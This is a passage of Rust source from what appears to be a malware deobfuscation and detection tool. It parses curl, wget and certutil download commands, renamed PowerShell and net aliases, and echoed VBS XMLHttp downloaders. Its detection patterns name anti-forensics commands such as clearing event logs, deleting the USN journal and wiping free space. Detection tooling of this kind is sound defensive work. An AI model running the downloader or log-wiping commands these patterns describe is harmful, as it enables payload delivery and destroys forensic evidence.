    #[test]
    fn mixed_case_xmlhttp_open_still_scans_echoed_vbs() {
        assert!(has_echoed_vbs_xmlhttp_shape(
            "echo Set http = CreateObject(\"MSXML2.XmLhTtP\")\r\necho http.OpEn \"GET\", u, False\r\n"
        ));
    }

    #[test]
    fn ignores_text_without_xmlhttp_shape() {
        assert!(!has_echoed_vbs_xmlhttp_shape(
            "echo http.Send\r\necho hello"
        ));
    }
}

fn has_echoed_vbs_xmlhttp_shape(deobfuscated: &str) -> bool {
    contains_ascii_case_insensitive(deobfuscated, "xmlhttp")
        && contains_ascii_case_insensitive(deobfuscated, ".open")
}

fn basename_trimmed(path: &str) -> Option<&str> {
    windows_basename(path).map(|name| name.trim_end_matches(['.', ' ']))
}

pub(crate) fn copied_alias_matches_command_ci(
    aliases: &std::collections::HashSet<String>,
    cmd: &str,
) -> bool {
    let Some(base) = basename_trimmed(cmd) else {
        return false;
    };
    aliases.iter().any(|alias| alias.eq_ignore_ascii_case(base))
}

fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let Some(src_base) = basename_trimmed(src) else {
            continue;
        };
        if !src_base.eq_ignore_ascii_case("curl") && !src_base.eq_ignore_ascii_case("curl.exe") {
            continue;
        }
        let Some(dst_base) = basename_trimmed(dst) else {
            continue;
        };
        aliases.insert(dst_base.to_string());
        if let Some(stem) = dst_base.strip_suffix(".exe") {
            aliases.insert(stem.to_string());
        }
    }
    if aliases.is_empty() {
        return;
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !copied_alias_matches_command_ci(&aliases, cmd) {
            continue;
        }
        if copied_curl_uses_config(&tokens) {
            let rest = line
                .get(cmd.len()..)
                .map(str::trim_start)
                .unwrap_or_default();
            let replay = if rest.is_empty() {
                "curl.exe".to_string()
            } else {
                format!("curl.exe {rest}")
            };
            crate::handlers::curl::h_curl(&replay, env);
            continue;
        }
        let Some((url, dst)) = parse_curl_like_download(&tokens) else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

fn copied_curl_uses_config(tokens: &[String]) -> bool {
    let mut i = 1;
    while i < tokens.len() {
        let token = tokens[i].trim_matches(['"', '\'']);
        if (token == "-K" || token.eq_ignore_ascii_case("--config")) && tokens.get(i + 1).is_some()
        {
            return true;
        }
        if let Some(value) = token.strip_prefix("-K") {
            if !value.is_empty() && !value.starts_with('-') {
                return true;
            }
        }
        let lower = token.to_ascii_lowercase();
        if lower.starts_with("--config=") || lower.starts_with("--config:") {
            return true;
        }
        i += 1;
    }
    false
}

pub fn scan_copied_powershell_invocations(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let Some(src_base) = basename_trimmed(src) else {
            continue;
        };
        if !matches!(
            src_base,
            s if s.eq_ignore_ascii_case("powershell.exe")
                || s.eq_ignore_ascii_case("powershell")
                || s.eq_ignore_ascii_case("pwsh.exe")
                || s.eq_ignore_ascii_case("pwsh")
        ) {
            continue;
        }
        let Some(dst_base) = basename_trimmed(dst) else {
            continue;
        };
        aliases.insert(dst_base.to_string());
        if let Some(stem) = dst_base.strip_suffix(".exe") {
            aliases.insert(stem.to_string());
        }
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !copied_alias_matches_command_ci(&aliases, cmd) {
            continue;
        }
        let Some(cmd_pos) = line.find(cmd) else {
            continue;
        };
        let tail = line[cmd_pos + cmd.len()..].trim();
        if tail.is_empty() {
            continue;
        }
        let synthetic = format!("powershell {tail}");
        crate::handlers::powershell::h_powershell(&synthetic, env);
    }
    dedup_exec_ps1(env);
}

fn scan_copied_cleanup_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let Some(src_base) = basename_trimmed(src) else {
            continue;
        };
        let cleanup_cmd = if src_base.eq_ignore_ascii_case("wevtutil")
            || src_base.eq_ignore_ascii_case("wevtutil.exe")
        {
            "wevtutil"
        } else if src_base.eq_ignore_ascii_case("fsutil")
            || src_base.eq_ignore_ascii_case("fsutil.exe")
        {
            "fsutil"
        } else if src_base.eq_ignore_ascii_case("reg") || src_base.eq_ignore_ascii_case("reg.exe") {
            "reg"
        } else if src_base.eq_ignore_ascii_case("cipher")
            || src_base.eq_ignore_ascii_case("cipher.exe")
        {
            "cipher"
        } else {
            continue;
        };
        let Some(dst_base) = basename_trimmed(dst) else {
            continue;
        };
        aliases.insert(dst_base.to_ascii_lowercase(), cleanup_cmd);
        if let Some(stem) = dst_base.strip_suffix(".exe") {
            aliases.insert(stem.to_ascii_lowercase(), cleanup_cmd);
        }
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        let Some(cleanup_cmd) = aliases.get(&cmd_base.to_ascii_lowercase()) else {
            continue;
        };
        let lower_line = line.to_ascii_lowercase();
        let action = match *cleanup_cmd {
            "wevtutil"
                if tokens.get(1).is_some_and(|tok| {
                    tok.eq_ignore_ascii_case("cl") || tok.eq_ignore_ascii_case("clear-log")
                }) =>
            {
                "event-log-clear"
            }
            "fsutil" if lower_line.contains(" usn ") && lower_line.contains(" deletejournal") => {
                "usn-journal-delete"
            }
            "reg"
                if tokens
                    .get(1)
                    .is_some_and(|tok| tok.eq_ignore_ascii_case("delete"))
                    && (lower_line.contains("userassist")
                        || lower_line.contains("runmru")
                        || lower_line.contains("muicache")) =>
            {
                "registry-history-delete"
            }
            "cipher"
                if tokens.iter().skip(1).any(|tok| {
                    tok.eq_ignore_ascii_case("/w") || tok.to_ascii_lowercase().starts_with("/w:")
                }) =>
            {
                "free-space-wipe"
            }
            _ => continue,
        };
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::AntiRecovery { action: existing } if existing == action
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::AntiRecovery {
            action: action.to_string(),
        });
    }
}

fn scan_copied_net_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let Some(src_base) = basename_trimmed(src) else {
            continue;
        };
        if !src_base.eq_ignore_ascii_case("net") && !src_base.eq_ignore_ascii_case("net.exe") {
            continue;
        }
        let Some(dst_base) = basename_trimmed(dst) else {
            continue;
        };
        aliases.insert(dst_base.to_string());
        if let Some(stem) = dst_base.strip_suffix(".exe") {
            aliases.insert(stem.to_string());
        }
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !copied_alias_matches_command_ci(&aliases, cmd) {
            continue;
        }
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        if rest.is_empty() {
            continue;
        }
        let replay = format!("net {rest}");
        crate::handlers::net::h_net(&replay, env);
    }
}

fn url_basename(url: &str) -> Option<String> {
    let path = url
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(url)
        .split('?')
        .next()
        .unwrap_or(url)
        .trim_end_matches('/');
    let name = path.rsplit('/').next()?.trim();
    if name.is_empty() {
        None
    } else {
        Some(name.to_string())
    }
}

fn clean_command_url_token(token: &str) -> &str {
    let token = token.trim_matches(['"', '\'']);
    token
        .split(['"', '\'', ')', ' ', '\t', '\r', '\n'])
        .next()
        .unwrap_or(token)
        .trim_end_matches(['.', ',', ';', ':'])
}

fn is_curl_remote_name_flag(token: &str) -> bool {
    let Some(flags) = token.strip_prefix('-') else {
        return false;
    };
    if flags.starts_with('-') {
        return false;
    }
    let bytes = flags.as_bytes();
    bytes.iter().any(|b| b.eq_ignore_ascii_case(&b'l'))
        && bytes.iter().any(|b| b.eq_ignore_ascii_case(&b'j'))
        && bytes.iter().any(|b| b.eq_ignore_ascii_case(&b'o'))
        && bytes.iter().any(|b| b.eq_ignore_ascii_case(&b'k'))
}

fn scan_curl_style_compact_flags_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        if !ends_with_ascii_case_insensitive(cmd_base, ".exe") {
            continue;
        }
        if !tokens
            .iter()
            .skip(1)
            .any(|token| is_curl_remote_name_flag(token.trim_matches('"')))
        {
            continue;
        }
        for token in tokens.iter().skip(1) {
            let url = token.trim_matches('"');
            let Some(url) = normalize_liberal_url_token(url) else {
                continue;
            };
            if !known.insert(url.clone()) {
                continue;
            }
            let dst = url_basename(&url);
            env.traits.push(Trait::Download {
                cmd: line.to_string(),
                src: url,
                dst,
            });
        }
    }
}

fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
    let mut url: Option<String> = None;
    let mut dst: Option<String> = None;
    let mut remote_name = false;
    let mut i = 1;
    while i < tokens.len() {
        let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
        let token = clean_command_url_token(raw_token);
        if raw_token == "-O" || raw_token.eq_ignore_ascii_case("--remote-name") {
            remote_name = true;
            i += 1;
            continue;
        }
        if is_curl_one_arg_flag(raw_token) {
            i += 2;
            continue;
        }
        if is_curl_attached_one_arg_short_flag(raw_token)
            || is_curl_attached_one_arg_long_flag(raw_token)
        {
            i += 1;
            continue;
        }
        if is_compact_curl_short_remote_name_flag(raw_token) {
            remote_name = true;
            i += 1;
            continue;
        }
        if curl_flag_matches_ci(raw_token, "-o") || curl_flag_matches_ci(raw_token, "--output") {
            let Some(next) = tokens.get(i + 1) else {
                i += 1;
                continue;
            };
            dst = Some(next.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output:"))
        {
            if !rest.is_empty() {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--url=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--url:"))
        {
            if let Some(normalized) =
                normalize_liberal_url_token(rest.trim_matches(['"', '\'', ')']))
            {
                url = Some(normalized);
            }
            i += 1;
            continue;
        }
        if raw_token.eq_ignore_ascii_case("--url") {
            let Some(next) = tokens.get(i + 1) else {
                i += 1;
                continue;
            };
            if let Some(normalized) =
                normalize_liberal_url_token(next.trim_matches(['"', '\'', ')']))
            {
                url = Some(normalized);
            }
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-o") {
            if !rest.is_empty() && !rest.starts_with('-') {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = compact_curl_short_output_arg(raw_token) {
            if rest.is_empty() {
                let Some(next) = tokens.get(i + 1) else {
                    i += 1;
                    continue;
                };
                dst = Some(next.trim_matches(['"', '\'', ')']).to_string());
                i += 2;
            } else {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
            }
            continue;
        }
        if let Some(normalized) = normalize_liberal_url_token(token) {
            url = Some(normalized);
        }
        i += 1;
    }
    url.map(|u| {
        let dst = dst.or_else(|| remote_name.then(|| url_basename(&u)).flatten());
        (u, dst)
    })
}

fn curl_tokens_have_download_url_candidate(tokens: &[String]) -> bool {
    let mut i = 1;
    while i < tokens.len() {
        let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
        if is_curl_one_arg_flag(raw_token) {
            i += 2;
            continue;
        }
        if is_curl_attached_one_arg_short_flag(raw_token)
            || is_curl_attached_one_arg_long_flag(raw_token)
        {
            i += 1;
            continue;
        }
        if contains_liberal_url_scheme(raw_token) {
            return true;
        }
        i += 1;
    }
    false
}

pub(crate) fn curl_flag_matches_ci(token: &str, flag: &str) -> bool {
    token.eq_ignore_ascii_case(flag)
}

const CURL_ONE_ARG_SHORT_FLAGS: &[&str] = &[
    "-d", "-H", "-X", "-A", "-e", "-b", "-c", "-u", "-m", "-T", "-F",
];

const CURL_ONE_ARG_LONG_FLAGS: &[&str] = &[
    "--data",
    "--data-ascii",
    "--data-binary",
    "--data-raw",
    "--data-urlencode",
    "--header",
    "--request",
    "--user-agent",
    "--referer",
    "--cookie",
    "--cookie-jar",
    "--user",
    "--proxy",
    "--connect-timeout",
    "--max-time",
    "--upload-file",
    "--form",
    "--form-string",
    "--retry",
    "--retry-delay",
];

fn is_curl_one_arg_flag(token: &str) -> bool {
    CURL_ONE_ARG_SHORT_FLAGS.contains(&token)
        || CURL_ONE_ARG_LONG_FLAGS
            .iter()
            .any(|flag| token.eq_ignore_ascii_case(flag))
}

fn is_curl_attached_one_arg_short_flag(token: &str) -> bool {
    CURL_ONE_ARG_SHORT_FLAGS
        .iter()
        .any(|flag| token.starts_with(flag) && token.len() > flag.len())
}

fn is_curl_attached_one_arg_long_flag(token: &str) -> bool {
    CURL_ONE_ARG_LONG_FLAGS.iter().any(|flag| {
        let Some(head) = token.get(..flag.len()) else {
            return false;
        };
        let Some(tail) = token.get(flag.len()..) else {
            return false;
        };
        !tail.is_empty() && head.eq_ignore_ascii_case(flag) && tail.starts_with(['=', ':'])
    })
}

fn compact_curl_short_output_arg(token: &str) -> Option<&str> {
    if !token.starts_with('-') || token.starts_with("--") || token.len() <= 2 {
        return None;
    }
    if is_curl_attached_one_arg_short_flag(token) {
        return None;
    }
    let flag = token[1..].find('o')?;
    let rest = &token[1 + flag + 1..];
    Some(rest)
}

fn is_compact_curl_short_remote_name_flag(token: &str) -> bool {
    token.starts_with('-')
        && !token.starts_with("--")
        && token.len() > 2
        && token[1..].contains('O')
}

fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
    let scheme_pos = ["https://", "http://", "ftp://"]
        .iter()
        .filter_map(|scheme| {
            find_ascii_case_insensitive_from(text, scheme, 0).map(|pos| (pos, scheme.len()))
        })
        .min_by_key(|(pos, _)| *pos)?
        .0;
    let mut raw = text[scheme_pos..].trim_start();
    let url_end = raw
        .as_bytes()
        .iter()
        .position(|b| b.is_ascii_whitespace() || matches!(*b, b'"' | b'\'' | b')' | b'<' | b'>'))
        .unwrap_or(raw.len());
    raw = &raw[..url_end];

    let url = raw.trim_end_matches(['.', ',', ';', ':']).to_string();
    if url.is_empty() {
        return None;
    }

    Some((url, None))
}

fn parse_curl_output_dst(text: &str) -> Option<String> {
    let tokens = split_words(text);
    let mut i = 0usize;
    while i < tokens.len() {
        let token = tokens[i].trim_matches(['"', '\'', ')']);
        if token.eq_ignore_ascii_case("-o") || token.eq_ignore_ascii_case("--output") {
            if let Some(next) = tokens.get(i + 1) {
                let dst = next.trim_matches(['"', '\'', ')']).to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if starts_with_ascii_case_insensitive(token, "--output=") {
            if token.len() > "--output=".len() {
                let dst = token["--output=".len()..]
                    .trim_matches(['"', '\'', ')'])
                    .to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if starts_with_ascii_case_insensitive(token, "--output:") {
            if token.len() > "--output:".len() {
                let dst = token["--output:".len()..]
                    .trim_matches(['"', '\'', ')'])
                    .to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if let Some(rest) = token.strip_prefix("-o") {
            if !rest.is_empty() && !rest.starts_with('-') {
                let dst = rest.trim_matches(['"', '\'', ')']).to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        }
        i += 1;
    }
    None
}

fn looks_like_curl_url(url: &str) -> bool {
    normalize_liberal_url_token(url).is_some_and(|url| {
        let Some((scheme, rest)) = url.split_once("://") else {
            return false;
        };
        matches!(scheme, "http" | "https" | "ftp") && !rest.is_empty()
    })
}

fn normalize_curl_text(curl_text: &str) -> std::borrow::Cow<'_, str> {
    let (prefix, prefix_len) = if starts_with_ascii_case_insensitive(curl_text, "curl.exe") {
        ("curl.exe", "curl.exe".len())
    } else if starts_with_ascii_case_insensitive(curl_text, "curl") {
        ("curl", "curl".len())
    } else {
        return std::borrow::Cow::Borrowed(curl_text);
    };
    let mut out = format!("{prefix}{}", &curl_text[prefix_len..]);

    if out.len() > prefix_len
        && !out
            .as_bytes()
            .get(prefix_len)
            .is_some_and(|b| b.is_ascii_whitespace())
    {
        if matches!(out.as_bytes().get(prefix_len), Some(b'"') | Some(b'\'')) {
            out.remove(prefix_len);
        }
        out.insert(prefix_len, ' ');
    }

    for needle in ["http://", "https://", "ftp://", "--output", "-o"] {
        while let Some(pos) = find_ascii_case_insensitive_from(&out, needle, 0) {
            let is_scheme = matches!(needle, "http://" | "https://" | "ftp://");
            if needle == "-o" && pos > 0 && out[..pos].ends_with('-') {
                break;
            }
            if pos > 0
                && !out
                    .as_bytes()
                    .get(pos - 1)
                    .is_some_and(|b| b.is_ascii_whitespace())
            {
                out.insert(pos, ' ');
                continue;
            }
            if !is_scheme {
                let after = pos + needle.len();
                if after < out.len()
                    && !matches!(out.as_bytes().get(after), Some(b'=') | Some(b':'))
                    && !out
                        .as_bytes()
                        .get(after)
                        .is_some_and(|b| b.is_ascii_whitespace())
                {
                    out.insert(after, ' ');
                }
            }
            break;
        }
    }

    std::borrow::Cow::Owned(out)
}

fn parse_redirect_dst(segment: &str) -> Option<String> {
    let mut search_from = 0;
    while let Some(rel) = segment[search_from..].find('>') {
        let pos = search_from + rel;
        let bytes = segment.as_bytes();
        if bytes.get(pos + 1) == Some(&b'&') {
            search_from = pos + 1;
            continue;
        }

        let rest = if bytes.get(pos + 1) == Some(&b'>') {
            &segment[pos + 2..]
        } else {
            &segment[pos + 1..]
        };
        let rest = rest.trim_start();
        if rest.starts_with('&') {
            search_from = pos + 1;
            continue;
        }

        let token = split_words(rest).into_iter().next()?;
        let dst = token.trim_matches(['"', '\'', ')']).to_string();
        if !dst.is_empty() {
            return Some(dst);
        }
        search_from = pos + 1;
    }
    None
}

fn scan_curl_redirect_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_ascii_case_insensitive(line, "curl")
            || !contains_liberal_url_scheme(line)
            || !line.contains('>')
        {
            continue;
        }
        let Some(curl_pos) = find_ascii_case_insensitive_from(line, "curl", 0) else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let redirect_dst = parse_redirect_dst(&curl_text);
        let command_text = curl_text.split('>').next().unwrap_or(&curl_text);
        let tokens = split_words(command_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        if !cmd_base.eq_ignore_ascii_case("curl") && !cmd_base.eq_ignore_ascii_case("curl.exe") {
            continue;
        }
        let parsed = parse_curl_like_download(&tokens).and_then(|(url, parsed_dst)| {
            if looks_like_curl_url(&url) {
                Some((url, parsed_dst))
            } else {
                None
            }
        });
        let Some((url, parsed_dst)) = parsed.or_else(|| parse_glued_curl_download(command_text))
        else {
            continue;
        };
        let parsed_dst = parsed_dst
            .or_else(|| parse_glued_curl_download(command_text).and_then(|(_, dst)| dst))
            .or_else(|| parse_curl_output_dst(command_text));
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst: parsed_dst.or(redirect_dst),
        });
    }
}

fn scan_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_ascii_case_insensitive(line, "curl") || !contains_liberal_url_scheme(line) {
            continue;
        }
        let Some(curl_pos) = find_ascii_case_insensitive_from(line, "curl", 0) else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let tokens = split_words(&curl_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        if !cmd_base.eq_ignore_ascii_case("curl") && !cmd_base.eq_ignore_ascii_case("curl.exe") {
            continue;
        }
        let parsed = parse_curl_like_download(&tokens).and_then(|(url, dst)| {
            if looks_like_curl_url(&url) {
                Some((url, dst))
            } else {
                None
            }
        });
        let raw_curl_text = &line[curl_pos..];
        let glued = if curl_tokens_have_download_url_candidate(&tokens) {
            parse_glued_curl_download(raw_curl_text)
        } else {
            None
        };
        let Some((url, dst)) = parsed.or(glued) else {
            continue;
        };
        let dst = dst
            .or_else(|| parse_glued_curl_download(raw_curl_text).and_then(|(_, dst)| dst))
            .or_else(|| parse_curl_output_dst(raw_curl_text));
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

fn parse_wget_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
    let mut url: Option<String> = None;
    let mut dst: Option<String> = None;
    let mut output_dir: Option<String> = None;
    let mut i = 1;
    while i < tokens.len() {
        let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
        let token = clean_command_url_token(raw_token);
        if is_wget_one_arg_flag(raw_token) {
            i += 2;
            continue;
        }
        if is_wget_attached_one_arg_long_flag(raw_token) {
            i += 1;
            continue;
        }
        if wget_flag_matches_ci(raw_token, "-o") && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token
            .strip_prefix("-O")
            .or_else(|| raw_token.strip_prefix("-o"))
        {
            if !rest.is_empty() && !rest.starts_with('-') {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-document=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-document:"))
        {
            if !rest.is_empty() {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if raw_token.eq_ignore_ascii_case("--output-document") && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if wget_flag_matches_ci(raw_token, "-p") && tokens.get(i + 1).is_some() {
            output_dir = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-P") {
            if !rest.is_empty() && !rest.starts_with('-') {
                output_dir = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix:"))
        {
            if !rest.is_empty() {
                output_dir = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if raw_token.eq_ignore_ascii_case("--directory-prefix") && tokens.get(i + 1).is_some() {
            output_dir = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if wget_flag_matches_ci(raw_token, "-i") && tokens.get(i + 1).is_some() {
            let candidate = tokens
                .get(i + 1)
                .map(|s| clean_command_url_token(s.trim_matches(['"', '\'', ')'])))
                .unwrap_or_default();
            if let Some(normalized) = normalize_liberal_url_token(candidate) {
                url = Some(normalized);
            }
            i += 2;
            continue;
        }
        if let Some(normalized) = normalize_liberal_url_token(token) {
            url = Some(normalized);
        }
        i += 1;
    }
    if dst.is_none() {
        dst = output_dir.and_then(|dir| {
            url.as_deref()
                .and_then(url_basename)
                .map(|name| join_dir_and_name(&dir, &name))
        });
    }
    url.map(|u| (u, dst))
}

pub(crate) fn wget_flag_matches_ci(token: &str, flag: &str) -> bool {
    token.eq_ignore_ascii_case(flag)
}

const WGET_ONE_ARG_LONG_FLAGS: &[&str] = &[
    "--post-data",
    "--post-file",
    "--method",
    "--body-data",
    "--body-file",
    "--header",
    "--user-agent",
    "--referer",
    "--load-cookies",
    "--save-cookies",
    "--keep-session-cookies",
];

fn is_wget_one_arg_flag(token: &str) -> bool {
    WGET_ONE_ARG_LONG_FLAGS
        .iter()
        .any(|flag| token.eq_ignore_ascii_case(flag))
}

fn is_wget_attached_one_arg_long_flag(token: &str) -> bool {
    WGET_ONE_ARG_LONG_FLAGS.iter().any(|flag| {
        let Some(head) = token.get(..flag.len()) else {
            return false;
        };
        let Some(tail) = token.get(flag.len()..) else {
            return false;
        };
        !tail.is_empty() && head.eq_ignore_ascii_case(flag) && tail.starts_with(['=', ':'])
    })
}

fn join_dir_and_name(dir: &str, name: &str) -> String {
    let dir = dir.trim_matches(['"', '\'']);
    if dir.is_empty() {
        return name.to_string();
    }
    let sep = if dir.contains('\\') { '\\' } else { '/' };
    let mut out = String::with_capacity(dir.len() + 1 + name.len());
    out.push_str(dir.trim_end_matches(['\\', '/']));
    out.push(sep);
    out.push_str(name);
    out
}

fn scan_wget_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_liberal_url_scheme(line)
            || (!contains_ascii_case_insensitive(line, "wget")
                && !contains_ascii_case_insensitive(line, "get.exe"))
        {
            continue;
        }
        let wget_pos = find_ascii_case_insensitive_from(line, "wget", 0)
            .or_else(|| find_ascii_case_insensitive_from(line, "get.exe", 0))
            .unwrap_or(0);
        let command_start = line[..wget_pos]
            .rfind([' ', '\t', '&', '(', ')'])
            .map_or(wget_pos, |idx| idx + 1);
        let wget_text = &line[command_start..];
        let tokens = split_words(wget_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !wget_command_matches_ci(cmd) {
            continue;
        }
        let Some((url, dst)) = parse_wget_like_download(&tokens) else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

fn scan_certutil_urlcache_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if (!contains_ascii_case_insensitive(line, "-urlcache")
            && !contains_ascii_case_insensitive(line, "/urlcache"))
            || !contains_liberal_url_scheme(line)
        {
            continue;
        }
        let tokens = split_words(line);
        let Some(url_idx) = tokens.iter().position(|token| {
            let token = clean_command_url_token(token);
            looks_like_liberal_url(token)
        }) else {
            continue;
        };
        let Some(url) = normalize_liberal_url_token(clean_command_url_token(&tokens[url_idx]))
        else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        let dst = tokens
            .iter()
            .skip(url_idx + 1)
            .find(|token| !token.starts_with('-') && !token.starts_with('/'))
            .map(|token| token.trim_matches(['"', '\'', ')']).to_string())
            .unwrap_or_default();
        env.traits.push(Trait::CertutilDownload { url, dst });
    }
}

fn scan_echoed_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_ascii_case_insensitive(line, "echo")
            || !contains_ascii_case_insensitive(line, "curl")
            || !contains_liberal_url_scheme(line)
        {
            continue;
        }
        let Some(curl_pos) = find_ascii_case_insensitive_from(line, "curl", 0) else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let tokens = split_words(&curl_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        if !cmd_base.eq_ignore_ascii_case("curl") && !cmd_base.eq_ignore_ascii_case("curl.exe") {
            continue;
        }
        let Some((url, dst)) = parse_curl_like_download(&tokens) else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

/// Detect `Start-Process … -Verb RunAs` (UAC elevation prompt) and
/// emit a SelfElevation trait. Matches both ordering forms:
